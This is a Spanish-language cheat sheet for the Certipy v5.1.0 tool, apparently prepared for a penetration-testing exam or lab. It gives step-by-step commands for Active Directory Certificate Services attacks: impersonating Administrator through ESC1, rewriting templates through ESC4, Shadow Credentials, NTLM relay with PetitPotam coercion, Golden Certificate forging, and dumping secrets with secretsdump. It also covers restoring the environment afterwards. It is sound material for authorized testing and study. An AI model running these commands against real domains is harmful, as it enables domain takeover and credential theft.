# Chuleta — Certipy v5.1.0

> ## ⚠️ ESTO NO ES v4
>
> Certipy **v5** cambió la interfaz respecto de v4, y casi todo el material online
> (writeups, blogs, guías) documenta v4. Si copiás un comando de internet sin verificar,
> **va a fallar**.
>
> | | v4 (lo que está online) | v5.1.0 (lo que tenés) |
> | --- | --- | --- |
> | Binario | `certipy` | **`certipy-ad`** |
> | Credenciales | `-u user@dom -p pass` | `-u user@dom -p pass` (igual) |
> | Subcomandos | `find`, `req`, `auth`, ... | iguales, **reorganizados** |
>
> **Regla**: verificá siempre con `certipy-ad <subcomando> --help`.

Binario verificado: `certipy-ad` → `/usr/bin/certipy-ad` (v5.1.0, by Oliver Lyak / ly4k)

---

## Subcomandos disponibles (verificado)

```text
{account, auth, ca, cert, find, parse, forge, relay, req, shadow, template}
```

| Subcomando | Qué hace |
| --- | --- |
| `find` | **Enumerar ADCS** — empezá siempre por acá |
| `req` | Pedir un certificado |
| `auth` | Autenticar con un certificado (→ hash NT) |
| `shadow` | Shadow Credentials (Key Credential Link) |
| `template` | Ver y **modificar plantillas** (ESC4) |
| `ca` | Administrar la CA |
| `forge` | Forjar certificados (Golden Certificate) |
| `relay` | Relay NTLM a los endpoints HTTP de ADCS (ESC8) |
| `account` | Administrar cuentas |
| `cert` | Manejar certificados y claves |
| `parse` | Enumerar ADCS offline desde datos de registro |

---

## 1. Enumerar

```bash
certipy-ad find -u '<USER>@<dominio.local>' -p '<PASS>' -dc-ip <DC_IP> \
                -vulnerable -stdout
```

Flags verificados: `-text`, `-stdout`, `-json`, `-csv`, `-output <prefijo>`,
`-enabled`, `-dc-only`, `-vulnerable`, `-oids`, `-hide-admins`, `-ns`, `-dns-tcp`

```bash
# Todo el panorama, filtrado a vulnerables, a archivo
certipy-ad find -u user@dominio.local -p 'Pass' -dc-ip <DC_IP> \
                -vulnerable -text -output adcs

# Solo plantillas habilitadas
certipy-ad find -u user@dominio.local -p 'Pass' -dc-ip <DC_IP> -enabled -stdout
```

> **Si falla la resolución de nombres**, agregá la CA y el DC a `/etc/hosts` y pasá el DNS:
> ```bash
> echo "<DC_IP> dc01.dominio.local dc01" | sudo tee -a /etc/hosts
> certipy-ad find -u user@dominio.local -p 'Pass' -dc-ip <DC_IP> -ns <DC_IP> -vulnerable -stdout
> ```

---

## 2. ESC1 — suplantar a Administrator

La plantilla permite `ENROLLEE_SUPPLIES_SUBJECT` y autenticación de cliente.

```bash
# Pedir el certificado pidiendo el UPN de Administrator
certipy-ad req -u '<USER>@<dominio.local>' -p '<PASS>' -dc-ip <DC_IP> \
               -ca '<NOMBRE_CA>' -template '<PLANTILLA_VULNERABLE>' \
               -upn 'administrator@<dominio.local>'

# Autenticar con el .pfx → devuelve el hash NT
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>
```

Flags verificados de `req`: `-ca`, `-template`, `-upn`, `-dns`, `-sid`, `-subject`,
`-retrieve`, `-on-behalf-of`, `-pfx`, `-archive-key`, `-web`, `-dcom`, `-out`

Flags verificados de `auth`: `-pfx`, `-password`, `-no-save`, `-no-hash`, `-print`,
`-kirbi`, `-username`, `-domain`, `-ldap-shell`

### Variantes útiles de `req`

```bash
# Si la plantilla lo exige, agregar un SID
certipy-ad req -u user@dominio.local -p 'Pass' -dc-ip <DC_IP> \
               -ca '<CA>' -template '<T>' -upn 'administrator@dominio.local' \
               -sid 'S-1-5-21-...-500'

# Alternativa con DNS SAN (algunas ESC requieren esto)
certipy-ad req -u user@dominio.local -p 'Pass' -dc-ip <DC_IP> \
               -ca '<CA>' -template '<T>' -dns 'dc01.dominio.local'

# Obtener shell LDAP en vez de solo el hash
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP> -ldap-shell
```

### Qué hace `auth`

Te da:
- El **hash NT** del usuario suplantado → Pass-the-Hash inmediato
- Un **`.ccache`** de Kerberos → Pass-the-Ticket

```bash
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass dc01.dominio.local -dc-ip <DC_IP>
```

---

## 3. ESC4 — escribir sobre una plantilla

Tenés `WriteDacl` / `GenericAll` sobre la plantilla y podés volverla vulnerable.

> **Hacé backup de la configuración ANTES.** Verificado: existen `-save-configuration`
> y `-write-configuration` para esto.

```bash
# 1) BACKUP del estado original
certipy-ad template -u '<USER>@<dominio.local>' -p '<PASS>' -dc-ip <DC_IP> \
                    -template '<PLANTILLA>' -save-configuration original.json

# 2) Volverla vulnerable
certipy-ad template -u '<USER>@<dominio.local>' -p '<PASS>' -dc-ip <DC_IP> \
                    -template '<PLANTILLA>' -write-default-configuration

# 3) Explotar como ESC1
certipy-ad req -u user@dominio.local -p 'Pass' -dc-ip <DC_IP> \
               -ca '<CA>' -template '<PLANTILLA>' -upn 'administrator@dominio.local'
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>

# 4) RESTAURAR el estado original
certipy-ad template -u '<USER>@<dominio.local>' -p '<PASS>' -dc-ip <DC_IP> \
                    -template '<PLANTILLA>' -write-configuration original.json
```

Flags verificados de `template`: `-template`, `-write-configuration`,
`-write-default-configuration`, `-save-configuration`, `-no-save`, `-force`

---

## 4. Shadow Credentials

Escribís un certificado en el atributo `msDS-KeyCredentialLink`. **No cambia la contraseña
del objetivo** — es la vía limpia cuando tenés `GenericWrite`.

```bash
# Automático: agrega, autentica, saca el hash, y limpia
certipy-ad shadow auto -u '<USER>@<dominio.local>' -p '<PASS>' \
                       -account '<OBJETIVO>' -dc-ip <DC_IP>
```

Subcomandos posicionales verificados: `{list,add,remove,clear,info,auto}`

```bash
# Ver qué hay (y si quedó algo de una prueba anterior)
certipy-ad shadow list -u user@dominio.local -p 'Pass' -account 'objetivo' -dc-ip <DC_IP>

# Agregar manualmente
certipy-ad shadow add -u user@dominio.local -p 'Pass' -account 'objetivo' -dc-ip <DC_IP>

# LIMPIAR — importante: dejá el entorno como lo encontraste
certipy-ad shadow remove -u user@dominio.local -p 'Pass' -account 'objetivo' -dc-ip <DC_IP>
certipy-ad shadow clear  -u user@dominio.local -p 'Pass' -account 'objetivo' -dc-ip <DC_IP>
```

> **Usá `shadow remove` o `shadow clear` al terminar.** Dejar credenciales de clave colgadas
> en el objeto es modificar el entorno sin necesidad.

---

## 5. ESC8 — Relay NTLM al HTTP de ADCS

```bash
# 1) Levantar el relay apuntando a la CA
certipy-ad relay -target 'http://<CA_HOSTNAME>' -ca '<NOMBRE_CA>'

# 2) Coercionar la autenticación del DC hacia tu Kali
PetitPotam.py -u '<USER>' -p '<PASS>' -d <dominio.local> <TU_IP> <DC_IP>
# Alternativa:
/usr/bin/nxc smb <DC_IP> -u user -p pass -M petitpotam

# 3) Certipy te devuelve el .pfx del DC
certipy-ad auth -pfx <dc>.pfx -dc-ip <DC_IP>
```

Uso verificado: `certipy-ad relay [-h] -target protocol://<ip address or hostname>`

> **Limitación de red**: el relay necesita que la víctima se conecte **de vuelta a vos**.
> A través de un SOCKS proxy esto **no funciona**. Necesitás ligolo-ng o un redireccionador.
> Ver `../07-pivoting.md`.

---

## 6. Golden Certificate

Si comprometés **la CA** (obtenés su clave privada), podés forjar certificados para cualquier
usuario. **Sobrevive al cambio de contraseña del `krbtgt`** — es más persistente que un
Golden Ticket.

```bash
# Backup de la CA (requiere acceso a la CA)
certipy-ad ca -u '<USER>@<dominio.local>' -p '<PASS>' -dc-ip <DC_IP> \
              -ca '<NOMBRE_CA>' -backup

# Forjar un certificado de Administrator
certipy-ad forge -ca-pfx '<CA>.pfx' -upn 'administrator@<dominio.local>' \
                 -subject 'CN=Administrator,CN=Users,DC=dom,DC=local' \
                 -issuer '<NOMBRE_CA>'

# Autenticar
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## 7. Otras operaciones

```bash
# Administrar cuentas (requiere certificado con permisos)
certipy-ad account -u user@dominio.local -p 'Pass' -user 'objetivo' -dc-ip <DC_IP> -read
# subcomandos: -read, -write, -update, -create

# Manejar certificados y claves locales
certipy-ad cert -pfx cert.pfx -password 'pass' -export -out cert.pem

# Enumerar ADCS offline desde datos de registro
certipy-ad parse -text -output adcs_offline
```

---

## ESC de referencia

| ESC | Vulnerabilidad | Requisito | Comando clave |
| --- | --- | --- | --- |
| **ESC1** | `ENROLLEE_SUPPLIES_SUBJECT` + client auth | Enrolar | `req -upn` → `auth` |
| **ESC2** | `Any Purpose` / sin EKU | Enrolar | `req` → `auth` |
| **ESC3** | Agent Certificate Template | Enrolar | `req` en dos pasos |
| **ESC4** | Escritura sobre la plantilla | `WriteDacl` | `template -write-default-configuration` |
| **ESC6** | `EDITF_ATTRIBUTESUBJECTALTNAME2` | Enrolar | `req -upn` |
| **ESC7** | CA Officer | `ManageCA` | `ca` |
| **ESC8** | Relay NTLM al HTTP de ADCS | Coerción + relay | `relay` |
| **ESC9/10** | Mapeo débil de certificados | Variable | |
| **ESC11/13/15** | Variantes y bypass de parches | Variable | |

---

## Higiene de estado

Modificar ADCS **cambia el entorno del examen**. Reglas:

1. **Backup antes de tocar**: `template -save-configuration <archivo>.json`
2. **Restaurar al terminar**: `template -write-configuration <archivo>.json`
3. **Limpiar shadow credentials**: `shadow remove` / `shadow clear`
4. **Anotá cada cambio** que hiciste en la bitácora. Si algo se rompe después, vas a necesitar
   saber qué tocaste.

---

## Diagnóstico de errores frecuentes

| Síntoma | Causa probable | Solución |
| --- | --- | --- |
| Falla la resolución de nombres | DNS no apunta al dominio | Agregar a `/etc/hosts` y usar `-ns <DC_IP>` |
| `KDC_ERR_...` en Kerberos | Reloj desincronizado | `sudo ntpdate <DC_IP>` o ajustar hora |
| No enumera plantillas | Falta `-dc-ip` o el LDAP no responde | Probar `-ldap-scheme ldaps` |
| El certificado no autentica | El CN no coincide | Verificar el `-ns` y probar variantes de `req` |
| `auth` no devuelve hash | La cuenta no tiene permisos de logon | Probar `-ldap-shell` |

> **Verificá siempre la sintaxis antes de copiar un comando de internet.**
> `certipy-ad <subcomando> --help` es la única fuente que refleja tu versión.
